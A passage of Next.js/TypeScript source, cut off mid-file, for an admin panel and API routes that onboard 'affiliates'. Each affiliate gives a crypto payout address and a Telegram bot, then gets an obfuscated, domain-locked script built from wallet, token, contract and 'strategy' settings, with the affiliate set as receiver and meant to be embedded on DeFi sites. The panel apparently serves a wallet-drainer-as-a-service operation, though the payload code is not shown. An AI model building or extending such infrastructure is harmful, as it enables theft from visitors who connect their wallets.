### src/app/affiliates/page.tsx

```tsx
"use client";

import { useEffect, useState, useCallback } from "react";
import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Users,
  Plus,
  Download,
  Trash2,
  Copy,
  CheckCircle2,
  AlertCircle,
  Shield,
  Check,
  PanelTop,
  KeyRound,
} from "lucide-react";
import { toast } from "sonner";
import { CompileOutput } from "@/components/compile/compile-output";
import type { AffiliateConfig } from "@/lib/projects";

type ObfuscationLevel = "none" | "minify" | "medium" | "heavy";

interface AffiliateProject {
  id: string;
  name: string;
  username: string;
  payoutAddress: string;
  telegramBotToken: string;
  telegramChatId: string;
  createdAt: string;
  status: "pending" | "active" | "paused" | "suspended";
  domains: string[];
  notes: string;
  lastCompiled: string | null;
}

interface GeneratedCredentials {
  username: string;
  password: string;
  affiliateName: string;
}

export default function AffiliatesPage() {
  const {
    setGeneralConfig,
    setWalletConfig,
    setModalConfig,
    setTokensConfig,
    setAdvancedConfig,
    setPayoutConfig,
  } = useStore();
  const [projects, setProjects] = useState<AffiliateProject[]>([]);
  const [loading, setLoading] = useState(true);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [creating, setCreating] = useState(false);
  const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null);
  const [loadingCompiler, setLoadingCompiler] = useState(false);

  // Credentials reveal modal
  const [credsOpen, setCredsOpen] = useState(false);
  const [generatedCreds, setGeneratedCreds] = useState<GeneratedCredentials | null>(null);

  // Form state
  const [name, setName] = useState("");
  const [payoutAddress, setPayoutAddress] = useState("");
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [notes, setNotes] = useState("");

  const loadProjects = useCallback(async () => {
    try {
      const res = await fetch("/api/projects", { cache: "no-store" });
      const data = await res.json();
      if (data.projects) setProjects(data.projects);
    } catch {
      toast.error("Failed to load affiliates");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { loadProjects(); }, [loadProjects]);

  async function handleCreate() {
    if (!name || !payoutAddress || !botToken || !chatId) {
      toast.error("Name, payout address, bot token, and chat ID are required");
      return;
    }
    setCreating(true);
    try {
      const res = await fetch("/api/projects", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name,
          payoutAddress,
          telegramBotToken: botToken,
          telegramChatId: chatId,
          notes,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message);

      // Show credentials modal — this is the only time the password is visible
      setGeneratedCreds({
        username: data.credentials.username,
        password: data.credentials.password,
        affiliateName: name,
      });
      setCredsOpen(true);
      setDialogOpen(false);
      resetForm();
      loadProjects();
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to create");
    } finally {
      setCreating(false);
    }
  }

  function resetForm() {
    setName("");
    setPayoutAddress("");
    setBotToken("");
    setChatId("");
    setNotes("");
  }

  async function handleResetPassword(p: AffiliateProject) {
    if (!confirm(`Reset password for ${p.name}? Their current password will stop working immediately.`)) return;
    try {
      const res = await fetch(`/api/projects/${p.id}/reset-password`, { method: "POST" });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message);

      setGeneratedCreds({
        username: data.credentials.username,
        password: data.credentials.password,
        affiliateName: p.name,
      });
      setCredsOpen(true);
      toast.success(`Password reset for ${p.name}`);
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Reset failed");
    }
  }

  async function handleCompile(id: string, affName: string) {
    const level: ObfuscationLevel = (prompt(
      "Obfuscation level:\n• none — raw JS\n• minify — minified\n• medium — obfuscated (default)\n• heavy — full protection + domain lock",
      "medium"
    ) || "medium") as ObfuscationLevel;

    try {
      const res = await fetch(`/api/projects/${id}/compile?obfuscate=${level}`);
      if (!res.ok) throw new Error("Compile failed");

      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `script-${affName.toLowerCase().replace(/\s+/g, "-")}.js`;
      a.click();
      URL.revokeObjectURL(url);

      toast.success(`Script compiled (${level}) for ${affName}`);
      loadProjects();
    } catch {
      toast.error("Failed to compile script");
    }
  }

  async function handleApprove(id: string, affName: string) {
    try {
      const res = await fetch(`/api/projects/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "active" }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.message || "Approval failed");
      toast.success(`${affName} approved`);
      await loadProjects();
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to approve affiliate");
    }
  }

  async function handleLoadCompiler(project: AffiliateProject) {
    setLoadingCompiler(true);
    try {
      const res = await fetch(`/api/projects/${project.id}/config`, { cache: "no-store" });
      const data = (await res.json()) as { config?: AffiliateConfig; message?: string };
      if (!res.ok || !data.config) {
        throw new Error(data?.message || "Failed to load affiliate config");
      }

      setGeneralConfig(data.config.general);
      setWalletConfig(data.config.wallet);
      setModalConfig(data.config.modal);
      setTokensConfig(data.config.tokens);
      setAdvancedConfig(data.config.advanced);
      setPayoutConfig(data.config.payout);
      setSelectedProjectId(project.id);
      toast.success(`Loaded ${project.name} into compiler`);
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to load compiler panel");
    } finally {
      setLoadingCompiler(false);
    }
  }

  async function handleDelete(id: string) {
    if (!confirm("Delete this affiliate project? This cannot be undone.")) return;
    try {
      await fetch(`/api/projects/${id}`, { method: "DELETE" });
      toast.success("Deleted");
      loadProjects();
    } catch {
      toast.error("Failed to delete");
    }
  }

  function copyToClipboard(text: string, label: string) {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied`);
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight flex items-center gap-2">
            <Users className="h-6 w-6" /> Affiliates
          </h1>
          <p className="text-muted-foreground text-sm mt-1">
            Create and manage affiliate projects. Credentials are auto-generated at creation.
          </p>
        </div>

        <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
          <DialogTrigger asChild>
            <Button className="gap-2 rounded-none font-mono text-xs uppercase tracking-wider">
              <Plus className="h-4 w-4" /> New Affiliate
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-lg bg-black/95 border-border/40">
            <DialogHeader>
              <DialogTitle className="font-mono uppercase tracking-wider text-sm">
                Create Affiliate Project
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-4 pt-2">
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Name / Label</Label>
                <Input
                  placeholder="e.g. John's DeFi Site"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Payout Address</Label>
                <Input
                  placeholder="0x..."
                  value={payoutAddress}
                  onChange={(e) => setPayoutAddress(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Telegram Bot Token</Label>
                <Input
                  placeholder="123456:ABC-DEF..."
                  value={botToken}
                  onChange={(e) => setBotToken(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Telegram Chat ID</Label>
                <Input
                  placeholder="-1001234567890"
                  value={chatId}
                  onChange={(e) => setChatId(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Notes (optional)</Label>
                <Textarea
                  placeholder="Internal notes about this affiliate..."
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 text-xs resize-none"
                  rows={2}
                />
              </div>
              <p className="text-[10px] text-muted-foreground font-mono">
                A username and password will be auto-generated. You&apos;ll see them once after creation.
              </p>
              <Button
                onClick={handleCreate}
                disabled={creating}
                className="w-full rounded-none font-mono text-xs uppercase tracking-wider"
              >
                {creating ? "Creating..." : "Create Project"}
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </div>

      {/* ── Credentials reveal modal ─────────────────────────────────────── */}
      <Dialog open={credsOpen} onOpenChange={setCredsOpen}>
        <DialogContent className="sm:max-w-md bg-black/95 border-border/40">
          <DialogHeader>
            <DialogTitle className="font-mono uppercase tracking-wider text-sm flex items-center gap-2">
              <KeyRound className="h-4 w-4 text-emerald-400" />
              Affiliate Credentials
            </DialogTitle>
          </DialogHeader>
          {generatedCreds && (
            <div className="space-y-4 pt-2">
              <p className="text-xs text-amber-400 font-mono">
                Save these credentials now — the password cannot be retrieved again.
              </p>
              <p className="text-xs text-muted-foreground">
                Affiliate: <span className="text-white font-medium">{generatedCreds.affiliateName}</span>
              </p>
              <div className="space-y-3">
                <div className="space-y-1">
                  <Label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">Username</Label>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 bg-black/60 border border-border/40 px-3 py-2 text-sm font-mono text-emerald-400 rounded-none">
                      {generatedCreds.username}
                    </code>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-9 w-9 rounded-none shrink-0"
                      onClick={() => copyToClipboard(generatedCreds.username, "Username")}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
                <div className="space-y-1">
                  <Label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">Password</Label>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 bg-black/60 border border-border/40 px-3 py-2 text-sm font-mono text-emerald-400 rounded-none">
                      {generatedCreds.password}
                    </code>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-9 w-9 rounded-none shrink-0"
                      onClick={() => copyToClipboard(generatedCreds.password, "Password")}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
              </div>
              <Button
                className="w-full rounded-none font-mono text-xs uppercase tracking-wider"
                onClick={() => {
                  const text = `Username: ${generatedCreds.username}\nPassword: ${generatedCreds.password}`;
                  copyToClipboard(text, "Credentials");
                }}
              >
                <Copy className="h-3.5 w-3.5 mr-2" /> Copy Both
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-4">
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Total Affiliates</p>
            <p className="text-2xl font-bold mt-1">{projects.length}</p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Active</p>
            <p className="text-2xl font-bold mt-1 text-emerald-500">
              {projects.filter((p) => p.status === "active").length}
            </p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Compiled</p>
            <p className="text-2xl font-bold mt-1">
              {projects.filter((p) => p.lastCompiled).length}
            </p>
          </CardContent>
        </Card>
      </div>

      {/* Table */}
      <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm font-mono uppercase tracking-wider">All Affiliates</CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <p className="text-sm text-muted-foreground py-8 text-center">Loading...</p>
          ) : projects.length === 0 ? (
            <p className="text-sm text-muted-foreground py-8 text-center">
              No affiliates yet. Click &quot;New Affiliate&quot; to create one.
            </p>
          ) : (
            <Table>
              <TableHeader>
                <TableRow className="border-border/40">
                  <TableHead className="text-[10px] font-mono uppercase">Name</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Username</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Payout</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Telegram</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Status</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Compiled</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase text-right">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {projects.map((p) => (
                  <TableRow key={p.id} className="border-border/20">
                    <TableCell>
                      <div>
                        <p className="text-sm font-medium">{p.name}</p>
                        <button
                          onClick={() => copyToClipboard(p.id, "Project ID")}
                          className="text-[10px] font-mono text-muted-foreground hover:text-white flex items-center gap-1 mt-0.5"
                        >
                          {p.id} <Copy className="h-2.5 w-2.5" />
                        </button>
                      </div>
                    </TableCell>
                    <TableCell>
                      <button
                        onClick={() => copyToClipboard(p.username || "", "Username")}
                        className="font-mono text-xs text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                        title="Copy username"
                      >
                        {p.username || <span className="text-muted-foreground">—</span>}
                        {p.username && <Copy className="h-2.5 w-2.5" />}
                      </button>
                    </TableCell>
                    <TableCell className="font-mono text-xs">
                      {p.payoutAddress.slice(0, 6)}...{p.payoutAddress.slice(-4)}
                    </TableCell>
                    <TableCell className="text-xs">
                      {p.telegramChatId ? (
                        <span className="flex items-center gap-1 text-emerald-500">
                          <CheckCircle2 className="h-3 w-3" /> Connected
                        </span>
                      ) : (
                        <span className="flex items-center gap-1 text-muted-foreground">
                          <AlertCircle className="h-3 w-3" /> Not set
                        </span>
                      )}
                    </TableCell>
                    <TableCell>
                      <Badge
                        variant="outline"
                        className={`rounded-none text-[10px] font-mono uppercase ${
                          p.status === "active"
                            ? "border-emerald-500/30 text-emerald-500"
                            : p.status === "pending"
                            ? "border-cyan-500/30 text-cyan-400"
                            : p.status === "paused"
                            ? "border-yellow-500/30 text-yellow-500"
                            : "border-red-500/30 text-red-500"
                        }`}
                      >
                        {p.status}
                      </Badge>
                    </TableCell>
                    <TableCell className="text-xs text-muted-foreground">
                      {p.lastCompiled
                        ? new Date(p.lastCompiled).toLocaleDateString()
                        : "Never"}
                    </TableCell>
                    <TableCell className="text-right">
                      <div className="flex items-center justify-end gap-1">
                        {p.status === "pending" && (
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-7 w-7 rounded-none hover:bg-emerald-500/10 hover:text-emerald-500"
                            onClick={() => void handleApprove(p.id, p.name)}
                            title="Approve Affiliate"
                          >
                            <Check className="h-3.5 w-3.5" />
                          </Button>
                        )}
                        {/* Reset Password */}
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-amber-500/10 hover:text-amber-400"
                          onClick={() => void handleResetPassword(p)}
                          title="Reset Password"
                        >
                          <KeyRound className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => void handleLoadCompiler(p)}
                          title="Load Affiliate Into Compiler"
                          disabled={p.status !== "active" || loadingCompiler}
                        >
                          <PanelTop className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => {
                            const base = process.env.NEXT_PUBLIC_BASE_URL || window.location.origin;
                            const scriptUrl = `${base}/api/script?configId=${p.id}`;
                            navigator.clipboard.writeText(
                              `<script src="${scriptUrl}"></script>`
                            );
                            toast.success("Script embed tag copied");
                          }}
                          title="Copy Script Embed Tag"
                        >
                          <Shield className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => handleCompile(p.id, p.name)}
                          title="Compile & Download Script"
                          disabled={p.status !== "active"}
                        >
                          <Download className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-red-500/10 hover:text-red-500"
                          onClick={() => handleDelete(p.id)}
                          title="Delete"
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {selectedProjectId && (
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardHeader>
            <CardTitle className="text-sm font-mono uppercase tracking-wider">
              Affiliate Compiler Panel
            </CardTitle>
          </CardHeader>
          <CardContent>
            <p className="mb-4 text-xs text-muted-foreground">
              The selected affiliate config is now loaded into the shared compile store. Use the compiler below to build their script.
            </p>
            <CompileOutput />
          </CardContent>
        </Card>
      )}
    </div>
  );
}
```

```tsx
function getDeterministicSuccessRate(seed: string) {
  let hash = 0;
  for (let index = 0; index < seed.length; index += 1) {
    hash = (hash * 31 + seed.charCodeAt(index)) % 1000;
  }
  return 60 + (hash % 35);
}
```

### src/app/api/admin/access/route.ts

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import {
  ADMIN_SENTINEL_ADDRESS,
  getAdminLoginPassphrase,
  getAdminLoginUsername,
  getAdminPanelPassword,
  getAuthSecret,
  SESSION_COOKIE,
  signSession,
} from "@/lib/auth";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const username = typeof body?.username === "string" ? body.username.trim() : "";
    const password = typeof body?.password === "string" ? body.password : "";
    const configuredUsername = getAdminLoginUsername();
    const configuredPassphrase = getAdminLoginPassphrase();
    const configuredPassword = getAdminPanelPassword();

    if (!configuredPassphrase && !configuredPassword) {
      return NextResponse.json(
        { status: "error", message: "Admin login credentials are not configured" },
        { status: 500 },
      );
    }

    if (!username) {
      return NextResponse.json(
        { status: "error", message: "Admin username is required" },
        { status: 400 },
      );
    }

    if (!password) {
      return NextResponse.json(
        { status: "error", message: configuredPassphrase ? "Admin passphrase is required" : "Admin password is required" },
        { status: 400 },
      );
    }

    const validUsername = username.toLowerCase() === configuredUsername.toLowerCase();
    const validSecret = configuredPassphrase ? password === configuredPassphrase : password === configuredPassword;

    if (!validUsername || !validSecret) {
      return NextResponse.json(
        { status: "error", message: "Invalid admin credentials" },
        { status: 403 },
      );
    }

    const cookieStore = await cookies();
    const secret = getAuthSecret();
    const session = signSession(
      { address: ADMIN_SENTINEL_ADDRESS, iat: Date.now(), v: 1, mode: "admin-password" },
      secret || "dev",
    );

    cookieStore.set({
      name: SESSION_COOKIE,
      value: session,
      httpOnly: true,
      sameSite: "lax",
      secure: process.env.NODE_ENV === "production",
      path: "/",
    });

    return NextResponse.json({
      status: "ok",
      session: {
        address: ADMIN_SENTINEL_ADDRESS,
        label: configuredUsername || "Global Admin",
        mode: configuredPassphrase ? "admin-passphrase" : "admin-password",
      },
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Invalid request" },
      { status: 400 },
    );
  }
}
```

### src/app/api/affiliate/access/route.ts

```typescript
/**
 * POST /api/affiliate/access
 *
 * Affiliate login endpoint.
 * Accepts { username, password } — credentials generated at project creation
 * (or after a reset-password call).
 */

import { NextResponse } from "next/server";
import { getProjectIdByUsername, getAffiliateProjectDecrypted } from "@/lib/projects";
import { sendTelegramNotification } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const username = typeof body?.username === "string" ? body.username.trim() : "";
    const password = typeof body?.password === "string" ? body.password : "";

    if (!username || !password) {
      return NextResponse.json(
        { status: "error", message: "Username and password are required" },
        { status: 400 },
      );
    }

    // Resolve username → project ID
    const projectId = await getProjectIdByUsername(username);
    if (!projectId) {
      return NextResponse.json(
        { status: "error", message: "Invalid credentials" },
        { status: 401 },
      );
    }

    const project = await getAffiliateProjectDecrypted(projectId);
    if (!project) {
      return NextResponse.json(
        { status: "error", message: "Invalid credentials" },
        { status: 401 },
      );
    }

    if (project.status === "pending") {
      return NextResponse.json(
        { status: "error", message: "Account is pending approval", projectStatus: project.status },
        { status: 403 },
      );
    }

    if (project.status !== "active") {
      return NextResponse.json(
        { status: "error", message: `Account is ${project.status}`, projectStatus: project.status },
        { status: 403 },
      );
    }

    if (project.accessSecret !== password) {
      return NextResponse.json(
        { status: "error", message: "Invalid credentials" },
        { status: 401 },
      );
    }

    void sendTelegramNotification({
      projectId: project.id,
      message:
        `🔐 Affiliate Login\n` +
        `project: <code>${project.id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `username: <code>${project.username}</code>\n` +
        `status: <b>${project.status}</b>`,
    });

    return NextResponse.json({
      status: "ok",
      project: {
        id: project.id,
        name: project.name,
        username: project.username,
        status: project.status,
      },
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Invalid request" },
      { status: 400 },
    );
  }
}
```

### src/app/api/affiliate/compile/route.ts

```typescript
/**
 * POST /api/affiliate/compile
 *
 * Public-facing compile endpoint for affiliates.
 * - Requires projectId in body
 * - Always compiles at "medium" obfuscation minimum (no "none" or "minify")
 * - Strips any sensitive internal config before generating the bundle
 * - Returns only the obfuscated script.js — never raw config
 */

import { NextResponse } from "next/server";
import {
  getAffiliateProject,
  getAffiliateConfig,
  updateAffiliateProject,
} from "@/lib/projects";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { readOperationalConfig } from "@/lib/operational-config-store";
import { obfuscateScript, obfuscateWithDomainLock, type ObfuscationLevel } from "@/lib/obfuscator";
import { sendTelegramNotification } from "@/lib/telegram";

const ALLOWED_LEVELS: ObfuscationLevel[] = ["medium", "heavy"];

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { projectId } = body;

    if (!projectId || typeof projectId !== "string") {
      return NextResponse.json(
        { status: "error", message: "Missing projectId" },
        { status: 400 }
      );
    }

    const project = await getAffiliateProject(projectId);
    if (!project) {
      return NextResponse.json(
        { status: "error", message: "Project not found" },
        { status: 404 }
      );
    }

    // Load saved config or defaults
    const config = await getAffiliateConfig(projectId);
    const operational = await readOperationalConfig();
    const general = config?.general ?? defaultGeneralConfig;
    const wallet = config?.wallet ?? defaultWalletConfig;
    const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
    const tokens = config?.tokens ?? defaultTokensConfig;
    const advanced = config?.advanced ?? defaultAdvancedConfig;

    // Generate the SDK bundle — only the payout address and affiliate label go in, never telegram/internal data
    let sdkBundle = generateSDKBundle({
      general,
      wallet,
      modal: { ...modal, exposeExternalSDK: true },
      tokens,
      advanced,
      contracts: operational.contracts,
      strategy: operational.strategy,
      appKit: operational.appKit,
      receiverAddress: project.payoutAddress,
      affiliateLabel: project.name,
    });

    // Force minimum "medium" obfuscation — affiliates cannot get raw/minified output
    const requestedLevel = (body.obfuscationLevel || "medium") as ObfuscationLevel;
    const level = ALLOWED_LEVELS.includes(requestedLevel) ? requestedLevel : "medium";

    if (project.domains && project.domains.length > 0) {
      sdkBundle = await obfuscateWithDomainLock(sdkBundle, project.domains, level);
    } else {
      sdkBundle = await obfuscateScript(sdkBundle, level);
    }

    // Mark as compiled
    await updateAffiliateProject(projectId, {
      lastCompiled: new Date().toISOString(),
    });

    void sendTelegramNotification({
      projectId,
      message:
        `🧩 Affiliate Compile\n` +
        `project: <code>${project.id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `obfuscation: <b>${level}</b>\n` +
        `domainLock: <b>${project.domains?.length ? "enabled" : "disabled"}</b>`,
    });

    return new Response(sdkBundle, {
      headers: {
        "content-type": "application/javascript; charset=utf-8",
        "content-disposition": `attachment; filename="script-${projectId}.js"`,
        "cache-control": "no-store",
        "x-content-type-options": "nosniff",
      },
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Compile failed" },
      { status: 500 }
    );
  }
}
```

```typescript
/**
 * PUT /api/affiliate/config
 *
 * Public-facing config save endpoint for affiliates.
 * - Requires projectId in body
 * - Only allows saving SDK config (general, wallet, modal, tokens, advanced)
 * - Never exposes or accepts payout address changes, telegram tokens, or internal settings
 * - Payout address is always pulled from the project record (set at creation)
 */

import { NextResponse } from "next/server";
import {
  getAffiliateProject,
  saveAffiliateConfig,
} from "@/lib/projects";
import type { AffiliateConfig } from "@/lib/projects";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
  defaultPayoutConfig,
} from "@/lib/mock-data";

export async function PUT(request: Request) {
  try {
    const body = await request.json();
    const { projectId, ...configData } = body;

    if (!projectId || typeof projectId !== "string") {
      return NextResponse.json(
        { status: "error", message: "Missing projectId" },
        { status: 400 }
      );
    }

    const project = await getAffiliateProject(projectId);
    if (!project) {
      return NextResponse.json(
        { status: "error", message: "Project not found" },
        { status: 404 }
      );
    }

    // Build config — payout address is ALWAYS from the project record, never from user input
    const config: AffiliateConfig = {
      general: { ...defaultGeneralConfig, ...configData.general },
      wallet: { ...defaultWalletConfig, ...configData.wallet },
      modal: { ...defaultModalConfig, ...configData.modal },
      tokens: { ...defaultTokensConfig, ...configData.tokens },
      advanced: { ...defaultAdvancedConfig, ...configData.advanced },
      payout: { ...defaultPayoutConfig, address: project.payoutAddress },
    };

    try {
      await saveAffiliateConfig(projectId, config);
      return NextResponse.json({ status: "ok", message: "Config saved" });
    } catch (err) {
      const message = err instanceof Error ? err.message : "Invalid config";
      return NextResponse.json({ status: "error", message }, { status: 400 });
    }
  } catch (err) {
    const message = err instanceof Error ? err.message : "Invalid request";
    return NextResponse.json({ status: "error", message }, { status: 400 });
  }
}
```

```typescript
/**
 * POST /api/affiliate/onboard
 *
 * Public endpoint — no auth required.
 * Affiliates submit their details here to create a project.
 * Returns the project ID so they can be redirected to the config page.
 */

import { NextResponse } from "next/server";
import { createAffiliateProject } from "@/lib/projects";
import { sendTelegramNotification } from "@/lib/telegram";
import { createAffiliateSchema } from "@/lib/validation";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const parsed = createAffiliateSchema.safeParse(body);

    if (!parsed.success) {
      const errors = parsed.error.issues.map((i) => i.message).join(", ");
      return NextResponse.json(
        { status: "error", message: errors },
        { status: 400 }
      );
    }

    const { name, payoutAddress, telegramBotToken, telegramChatId, notes } =
      parsed.data;

    const { project } = await createAffiliateProject({
      name,
      payoutAddress,
      telegramBotToken,
      telegramChatId,
      notes: notes || "",
      status: "pending",
    });

    void sendTelegramNotification({
      projectId: project.id,
      message:
        `🆕 Affiliate Onboarded\n` +
        `project: <code>${project.id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `status: <b>${project.status}</b>\n` +
        `payout: <code>${project.payoutAddress}</code>`,
    });

    return NextResponse.json(
      { status: "ok", project: { id: project.id, name: project.name } },
      { status: 201 }
    );
  } catch {
    return NextResponse.json(
      { status: "error", message: "Invalid request" },
      { status: 400 }
    );
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { ADMIN_SENTINEL_ADDRESS, getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";

export async function GET() {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return NextResponse.json({ status: "ok", authenticated: false });

  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");

  if (!session?.address) {
    return NextResponse.json({ status: "ok", authenticated: false });
  }

  return NextResponse.json({
    status: "ok",
    authenticated: true,
    address: session.address,
    authType: session.address === ADMIN_SENTINEL_ADDRESS ? "admin-password" : "wallet",
    label: session.address === ADMIN_SENTINEL_ADDRESS ? "Global Admin" : session.address,
  });
}
```

```typescript
import { NextResponse } from "next/server";
import { cookies, headers } from "next/headers";
import { buildSiweLikeMessage, createNonce, NONCE_COOKIE } from "@/lib/auth";

export async function GET() {
  const nonce = createNonce();

  const h = await headers();
  const host = h.get("host") || "localhost";
  const domain = host.split(":")[0];

  const cookieStore = await cookies();
  cookieStore.set({
    name: NONCE_COOKIE,
    value: nonce,
    httpOnly: true,
    sameSite: "lax",
    secure: process.env.NODE_ENV === "production",
    path: "/",
    maxAge: 60 * 10,
  });

  return NextResponse.json({
    status: "ok",
    nonce,
    message: buildSiweLikeMessage({ domain, nonce }),
  });
}
```

### src/app/api/auth/verify/route.ts

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAddress, verifyMessage } from "viem";
import {
  buildSiweLikeMessage,
  getAuthSecret,
  NONCE_COOKIE,
  SESSION_COOKIE,
  signSession,
} from "@/lib/auth";
import { sendTelegramMessage } from "@/lib/telegram";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const addressRaw = body?.address;
    const signature = body?.signature;
    const nonceFromBody = body?.nonce;

    if (!addressRaw || !signature) {
      return NextResponse.json(
        { status: "error", message: "address and signature are required" },
        { status: 400 }
      );
    }

    const cookieStore = await cookies();
    const nonceFromCookie = cookieStore.get(NONCE_COOKIE)?.value;

    const nonce = nonceFromBody || nonceFromCookie;
    if (!nonce || !nonceFromCookie || nonce !== nonceFromCookie) {
      return NextResponse.json(
        { status: "error", message: "Invalid or missing nonce" },
        { status: 400 }
      );
    }

    const address = getAddress(addressRaw);
    const domain = new URL(request.url).host.split(":")[0];
    const message = buildSiweLikeMessage({ domain, nonce });

    const ok = await verifyMessage({
      address,
      message,
      signature,
    });

    if (!ok) {
      return NextResponse.json(
